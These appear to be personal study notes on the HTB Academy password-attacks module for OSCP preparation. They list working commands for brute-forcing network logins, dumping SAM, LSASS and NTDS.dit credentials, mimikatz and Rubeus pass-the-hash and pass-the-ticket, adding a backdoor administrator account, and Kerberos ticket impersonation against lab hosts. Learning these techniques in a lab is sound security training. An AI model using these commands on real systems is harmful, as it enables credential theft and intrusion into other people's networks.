---
layout: single
title:  "HTB Academy - Password Attacks"
categories: 
  - OSCP Notes
tags:
  - htb-academy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/password-attacks-notes
author_profile: false
sidebar:
  nav: "navbar"
---

## Credential Storage

### Linux

* `/etc/shadow` file, passwords are stored as hashes.
* `/etc/passwd` file (accessible by all); password hashes are usually redirected to the shadow file (which is only accessible by `root`).

### Windows

* Local Security Authority (`LSA`) handles user authentication, through the `LSASS` service.
* Security Account Manager (`SAM`) database stores user password hashes (`LM` or `NTLM`).
* Domain Controllers host a `NTDS.dit` file which stores user accounts and password hashes.

## Cracking Network Services

Password cracking tools: `crackmapexec` and `hydra`.

### WinRM

Use `crackmapexec`: `crackmapexec winrm <target ip> -u user.list -p password.list`.

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user.

* To interact with the target via WinRM, use `evil-winrm`.

### SSH

Use `hydra`: `hydra -L user.list -P password.list ssh://<target ip>`.

Alternatively, `crackmapexec` can be used as well.

### RDP

Use `hydra`: `hydra -L user.list -P password.list rdp://<target ip>`.

### SMB

Use `hydra`: `hydra -L user.list -P password.list smb://<target ip>`.

* If `hydra` has an error (due to SMBv3), we can use the `auxiliary/scanner/smb/smb_login` module in `msfconsole` instead.

Alternatively, `crackmapexec` can be used as well. We can also enumerate shares through `crackmapexec`, instead of doing it from `smbclient`.

## Password Mutations

### Hashcat

`hashcat` can be used to generate possible password mutations (through provided mutation rules):

* `hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`

| **Function** | **Description**                                   |
| ------------ | ------------------------------------------------- |
| `:`          | Do nothing.                                       |
| `l`          | Lowercase all letters.                            |
| `u`          | Uppercase all letters.                            |
| `c`          | Capitalize the first letter and lowercase others. |
| `sXY`        | Replace all instances of X with Y.                |
| `$!`         | Add the exclamation character at the end.         |

A good rule that can be used is `/usr/share/hashcat/rules/best64.rule`.

### CeWL

To generate word lists from a provided source (like a company website), we can use the `CeWL` tool. This scans for potential words, and can be combined with a rule list to generate a list of possible passwords.

* `-d`: Used to specify the depth to spider.
* `-m`: Used to specify the minimum word length.
* `--lowercase`: Used to store found words in lowercase.
* `-w`: Used to indicate the path of the output file.

We can use `wc -l` to count the number of words retrieved.

## Password Reuse/Default Passwords

Default **application** credentials cheat sheet: <https://github.com/ihebski/DefaultCreds-cheat-sheet>

Default **router** credentials cheat sheet: <https://www.softwaretestinghelp.com/default-router-username-and-password-list/>

Attacking services with default credentials is known as credential stuffing.

To do this with `hydra`: `hydra -C <user:pass list> <protocol>://<ip>`, where the `user:pass` list is a list (possibly mutated) of username to password pairs.

## Windows Attacks

### SAM

SAM registry hives:

* `hklm/sam`: Contains the hashes associated with local account passwords.
* `hklm/system`: Contains the system bootkey, which is used to encrypt the SAM database.
* `hklm/security`: Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

We can make copies of the registry hives if we run `cmd` as admin: `reg.exe save <reg hive> <filepath>`.

* Once done, transfer the registry hive copies to our local machine using any file transfer method.

Dump the hashes using the `secretsdump.py` script (or use `msfconsole`). Note that to execute this process, the bootkey must be retrieved in order to decrypt the SAM database and dump hashes.

* Note that we want the NT hashes instead of LM hashes.
* These hashes can then be cracked using `hashcat` on mode 1000 (`NTLM`).

If we have admin credentials, we can also dump LSA secrets and SAM remotely using `crackmapexec`.

* `crackmapexec smb <ip> --local-auth -u <name> -p <password> --lsa`
* `crackmapexec smb <ip> --local-auth -u <name> -p <password> --sam`

### LSASS

Note that credentials of logged on users are cached locally in memory. These credentials can be dumped.

Using Task Manager (if GUI session is available):

* Select the `Processes` tab > Find and right click on `Local Security Authority Process` > Select `Create dump file`. The dump file can be found in `AppData/Local/Temp`.

`rundll32.exe`:

* Firstly, get `PID` of `lsass.exe` using the `tasklist /svc` command in `cmd`, or `Get-Process lsass` in PowerShell.
* Then, generate the dump file in PowerShell (admin privilege required) with `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`. Note that this method is recognised as malicious by many AV systems, and may not execute.
  * Here, `rundll32` is calling `comsvcs.dll`, which calls the `MiniDump` function to dump LSASS memory.

To extract credentials from the LSASS dump, we can use `pypykatz`: `pypyatz lsa minidump <path to dump file>`

* The `MSV` section contains user credentials.
* The `WDIGEST` section contains **plaintext** user credentials, if the protocol is enabled.
* The `Kerberos` section contains AD credentials.
* The `DPAPI` section contains a `masterkey` which can be used to decrypt secrets found in dependent applications like IE, Chrome, Outlook, RDP and Credential Manager.

Note that `pypykatz` may not work correctly. It might be better to run `mimikatz` on the target instead (`privilege::debug; sekurlsa::logonpasswords`).

Note that we can use CrackStation to find passwords (if existing wordlists do not suffice).

### Active Directory

Systems joined to a domain will no longer default to the SAM database for credential storage and verification. Instead, authentication requests are now validated by the domain controller using the `NTDS.dit` file. (<https://attack.mitre.org/techniques/T1003/003/>)

* This does not imply that the SAM database is no longer in use!
* To logon using a local account in the SAM database, we specify the hostname of the device preceded by the username (e.g., `WS01/username`).

Companies have their own username convention. We can generate these permutations manually, or through a tool like `username-anarchy`.

* Note that usernames can typically be derived from valid company email addresses.

Likewise, once we have our username permutation list (or once we know the valid naming convention), we can use `crackmapexec` on `SMB` mode to derive passwords.

* Note that after a number of failed attempts, it is possible for our target account to be locked out. However, some organisations may not enforce this, which makes online attacks vulnerable.

Once logged in to a domain controller (maybe through `WinRM`), we can get `NTDS.dit` at `%systemroot%/ntds`.

* Note that to make a copy of this file, local/domain admin privileges are required (in the `Administrators` or `Domain Admins` groups). This can be checked using the `net localgroup` and `net user <username>` commands.
* Make a copy of the root drive (usually `C:\`) using `vssadmin`, as it is likely the NTDS is stored on the same drive. `vssadmin CREATE SHADOW /For=C:`.
* Then, copy the file and transfer it to our host: `cmd.exe /c copy <shadow copy path>/Windows/NTDS/NTDS.dit <dest filepath>`

Alternatively, we can use `crackmapexec` to capture and dump the file, using the `--ntds` option.

* We can then try to crack the obtained hashes.

Note: If hash cracking attempts are unsuccessful, we can still try to Pass-the-Hash (PtH). This abuses the NTLM protocol which authenticates users using password hashes.

* `evil-winrm -i <ip> -u <username> -H "<ntlm hash>"`
* This is useful for lateral movement within a network.

### Credential Hunting

`lazagne.exe` will be useful. We can make a copy of this file in the target and run it in `cmd` using `start lazagne.exe all`.

Alternatively, we can also use the `findstr` command to look for clear-text passwords in files (like `.txt`, `.ini`, `.cfg`, `.config`, `.xml`, `.git`, `.ps1`, `.yml` files).=

## Linux Attacks

### Credential Hunting

Files to look through: Configuration files, scripts, DBs, cron jobs, notes and SSH keys.

* Configuration files usually have `.config`, `.conf` and `.cnf` extensions.
* Cron jobs are found in `/etc/crontab`, or `/etc/cron.*`; credentials may be found here as some apps and scripts require credentials to run.

History files like `.bash_history` can contain useful information as well.

* Don't neglect configuration files like `.bashrc` or `.bash_profile` either.

Log files are found in `/var/log`, we could try to `grep` strings of interest.

For credentials which may be stored in-memory, we can use `mimipenguin` or `lazagne`.

For browser-based (Firefox) credentials, the `logins.json` file contains encrypted credentials which can be decrypted.

* `lazagne` can decrypt these credentials as well.

### Passwd/Shadow/Opasswd

Linux Pluggable Authentication Modules (PAM) manage user information, sessions and credentials.

* For example, if we want to change passwords using `passwd`, the PAM is called to manage this process.

Note that the `/etc/passwd` file is readable by all users. However, if write access is allowed, we could clear the password field for `root`, and this would result in the root user not having any password (and hence, no prompt when attempting to login).

For the `/etc/shadow` file, if the password field contains a character like `!` or `*`, this means that the user cannot log in with a Unix password, so some other form of authentication like Kerberos or key-based authentication must be used.

Encrypted password format: `$<type>$<salt>$<hash>`

Hashing algorithms:

* `$1$` – MD5
* `$2a$` – Blowfish
* `$2y$` – Eksblowfish
* `$5$` – SHA-256
* `$6$` – SHA-512

By default, the SHA-512 (`$6$`) encryption method is used on the latest Linux distributions.

Old passwords are stored in the `/etc/security/opasswd` file to prevent password reuse.

The `unshadow` command (part of `john`) can be used to combine the `passwd` and `shadow` files together. These unshadowed hashes can then be cracked using `hashcat`.

## Lateral Movement - Pass the Hash (PtH)

Recall that NTLM is vulnerable to PtH attacks, where authentication can be carried out with hashes instead of plaintext passwords.

### Mimikatz (Windows)

To do PtH with `mimikatz`, we can use the module `sekurlsa::pth`: `sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe`.

* Note that `/rc4` or `/NTLM` are both usable options to pass in the NTLM hash.
* For local user accounts, the `/domain` argument can be set as the computer name, `localhost`, or a dot (`.`).
* If the `/run` argument is left blank, `cmd.exe` is automatically triggered.

### Invoke-TheHash (Windows)

Alternatively, PtH can be executed using `Invoke-TheHash` PowerShell functions. Note that we want to use credentials with administrator rights.

* We can choose to do SMB or WMI command execution using this tool.
* We can also do RCE using a reverse shell and `netcat` listener.

Required parameters:

* `Target`: The hostname or IP address of the target.
* `Username` and `Hash`: Hash can be in `LM:NTLM` or `NTLM` format.
* `Domain`: Not necessary with local accounts, or if `@domain` is used after the username.
* `Command`: If not specified, the function checks to see if the user has access to WMI on the target.

**SMB**:

```
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

**WMI**:

```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<reverse shell command>"
```

### Impacket (Linux)

`impacket-psexec` can be used for RCE: `impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`.

* Similarly, the `wmiexec`, `atexec` and `smbexec` tools can all be used.

### CrackMapExec (Linux)

We can do password spraying on a domain using `crackmapexec`: `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`.

If we wish to authenticate using the local administrator's password hash instead, we can add the `--local-auth` option to our command.

Then, command execution can be done using the `-x` option.

### evil-winrm (Linux)

We can sign in to WinRM using a hash: `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`.

* This is useful if SMB is blocked, or we don't have administrator rights.
* Note: If connecting to a domain account, include the domain name after the user name in this format: `username@domain_name`.

### RDP (Linux)

Caveat: `Restricted Admin Mode` must be enabled on the target host for this to work. This can be enabled by adding a new Registry Key `DisableRestrictedAdmin`.
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

Once that is done, we can PtH using the `/pth` option in `xfreerdp` to gain access.

Note that the User Account Controls (UAC) limit remote administration as well. Typically, only the `Administrator` account (`RID-500`) can do these remote admin tasks. Depending on the policies used, all local admins could do these tasks, or no users can do remote admin tasks.

* Relevant policies/registry keys: `LocalAccountTokenFilterPolicy` and `FilterAdministratorToken`.

NTLM Hashes:
`julio 64f12cddaa88057e06a81b54e73b949b`
`john  c4b0e1b10c7ce2c4723b4e2407ef81a2`
`david c39f2beb3d2ec06a62cb887fb391dee0`

## Lateral Movement - Pass the Ticket (PtT)

Idea - use stolen Kerberos tickets to move around instead of NTLM password hashes.

### Kerberos Refresher

Kerberos is ticket-based; services are provided tickets instead of passwords.

* Tickets are all stored on local system.

Ticket Granting Ticket (TGT) is the first ticket obtained on Kerberos, where it permits the client to obtain additional Kerberos tickets or TGS.

Ticket Granting Service (TGS) is requested by users who want to use a service, where the tickets allow services to verify a user's identity.

High-level flow of events:

1. Client authenticates to the domain controller using the user's password, where this password hash is used to encrypt a message.
2. The domain controller decrypts the ciphertext using the same password hash; successful decryption entails the sending of TGT back to the client for future requests.
3. The client then requests TGS from the Key Distribution Center (KDC) for a specified service using the TGT. This TGS ticket for the aforementioned service is then passed to the service for authentication.

### Windows PtT

To execute PtT attack, we can use either the service ticket (from TGS), or TGT. TGT grants us access to a wider variety of resources allowed to the user.

Using `mimikatz`: `"privilege::debug" "sekurlsa::tickets /export"` will export tickets for all users (stored by LSASS) to a `.kirbi` file.

* Computer account tickets have names which end in `$`, while user tickets have a naming convention as follows: `[randomvalue]-username@service-domain.local.kirbi`.
* Tickets with `krbtgt` in the name correspond to the TGT of the account.

Using `Rubeus`: `dump /nowrap` will dump tickets in `base64` format instead. This could be a viable alternative to `mimikatz` as exported `.kirbi` tickets may not work as intended.

Note that we need to run both `mimikatz` and `Rubeus` as administrator for PtT to work.

#### Pass the Key/OverPass the Hash

Instead of using a non-Kerberos NTLM password hash, this approach converts a hash/key for a domain-joined user into a full TGT, which is used in PtH.

Using `mimikatz`: Dump Kerberos encryption keys using `sekurlsa::ekeys`. Look out for the `AES256_HMAC` and `RC4_HMAC` keys, which are used in a traditional PtH attack.

Using `Rubeus`: We can use `asktgt` to forge tickets. `asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap`.

* The key used can be `/rc4`, `/aes128`, `/aes256` or `/des`. These keys can be obtained from `mimikatz.exe "sekurlsa::ekeys"`.
* In this case, we do not need to run `Rubeus` as administrator.

#### Rubeus PtT

For example, to execute PtT by forging tickets from OverPass the hash, we can append `/ptt` to the end of the above command. This submits the ticket to the current session.

* Alternatively, we can import a `.kirbi` ticket from `mimikatz` using `ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`.
* The ticket can also be submitted in `base64` format.

#### Mimikatz PtT

Use the `kerberos::ptt` module and the `.kirbi` file to import a ticket to the current session: `kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"`.

Note that if we run `mimikatz` interactively, we need to append `exit` to the end of our command in order for our command to execute correctly. For example, from `cmd.exe`, we run `mimikatz.exe "privilege::debug" "kerberos::ptt ..." exit` to allow `mimikatz` to load the ticket into the current `cmd.exe` session.

* To circumvent this, we can use the `misc::cmd` module to spawn a new window with the imported ticket.

#### PtT with PowerShell Remoting

If enabled, we can run PowerShell remotely from `cmd.exe` with imported tickets using the `Enter-PSSession` command.

* With `mimikatz`, we load the tickets into the current `cmd.exe` session.
* Then, run `powershell; Enter-PSSession -ComputerName <hostname>`.

With `Rubeus`, we can use the `createnetonly` option to spawn a sacrificial process/logon session (Logon type 9): `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`.

* Using `/show` is the equivalent of `runas /netonly`, and prevents the erasure of existing TGTs for the current logon session.
* Within this new process, we can run `Rubeus` to forge a new TGT and import it into the current session for PowerShell remoting.

### Linux PtT

Linux systems can be connected to AD and use Kerberos for authentication.

On Linux, Kerberos tickets are usually stored as `ccache` files in the `/tmp` directory. By default, the environment variable `KRB5CCNAME` contains the location of the Kerberos ticket.

`keytab` files on Linux also use Kerberos for authentication.

To check if a Linux machine is domain joined, we can use `realm list`. This gives us information about the machine configuration, as well as the domain name and permitted logins.

* If `realm` is not available, we can also use `sssd` or `winbind`. Search for these services using `ps -ef | grep -i "winbind\|sssd"`.

#### Finding tickets

We can find `keytab` files using the `find` command: `find / -name *keytab* -ls 2>/dev/null`.

* We need `rw` permissions to use the `keytab` file.

Alternatively, `keytab` files could also be found in scheduled cronjobs, where some tasks may refer to `keytab` files that do not follow the standard naming convention.

* This may happen if the cronjob interacts with a Windows service using Kerberos. Look out for the usage of the `kinit` command.

For `ccache` files, we can look for it in `/tmp`, using the `KRB5CCNAME` environment variable. If our logged on user is root or privileged, we can impersonate other users using their `ccache` files while it is valid.

#### Using keytab files

To view the information in a `keytab` file, we can use `klist -k -t`. This lets us see which user the ticket corresponds to.

Then, we can impersonate the aforementioned user with `kinit`: `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`

Note that we can confirm our current user using the `klist` command. If impersonation was done successfully, the default principal displayed will be different after running `klist`.

To keep a ticket from the current session, make sure to keep a backup of the `ccache` file stored in `KRB5CCNAME`.

If we want to extract password hashes from the `keytab` file, we can use `keytabextract`. The obtained NTLM hashes will allow us to do a PtH attack. We can also forge tickets with `Rubeus`.

* To go one step further, we can attempt to crack the NTLM hashes and get a plaintext password.

#### Using ccache files

As long as we can read a `ccache` file, we can use it to impersonate a user. This can occur if we have root access.

To impersonate users through their `ccache` files, simply make a copy of the file and set the path of `KRB5CCNAME` to the copied `ccache` file: `export KRB5CCNAME=/root/krb5cc_647401106_I8I133`.

* Likewise, check if impersonation was successful using `klist`.
* Note that these files do not last forever, if they expire, the file can no longer be used.

## Protected Files and Archives

SSH keys can be encrypted. It is possible to generate hashes from these keys using `ssh2john`. Afterwards, the hashes can be cracked.

Documents like `.docx` can also be password protected. In this case, the hashes can also be extracted using `office2john`.

Archives can be password protected. Hashes can be extracted using tools like `zip2john`.

For `openssl` encrypted files, it may be safer to attempt decryption using the `openssl` tool itself, within a for loop: `for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done`

For `bitlocker` encrypted drives, the `AES` algorithm is used with a bit length of 128 or 256. The recovery key for decryption can theoretically be brute-forced and used for decryption. Hashes can be dumped from `bitlocker` encrypted drives using `bitlocker2john`, and hashes can be cracked using `john` or `hashcat`.
